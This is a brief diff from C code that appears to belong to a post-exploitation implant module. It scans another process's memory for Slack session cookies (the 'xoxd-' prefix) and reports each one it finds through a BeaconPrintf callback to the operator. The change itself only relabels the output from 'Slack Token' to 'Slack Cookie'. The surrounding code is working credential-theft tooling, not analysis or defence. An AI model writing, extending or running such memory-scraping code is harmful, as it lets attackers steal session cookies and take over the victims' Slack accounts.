@@ -91,7 +91,7 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
         // search for xoxd- [78 6f 78 64 2d] 
         if (buffer[index] == 0x78 && buffer[index + 1] == 0x6f && buffer[index + 2] == 0x78 && buffer[index + 3] == 0x64 && buffer[index + 4] == 0x2d)
         {
-            BeaconPrintf(CALLBACK_OUTPUT, "Slack Token: %s", buffer + index);
+            BeaconPrintf(CALLBACK_OUTPUT, "Slack Cookie: %s", buffer + index);
             index += MSVCRT$strlen((char *)(buffer + index)) - 1;
         }
     }
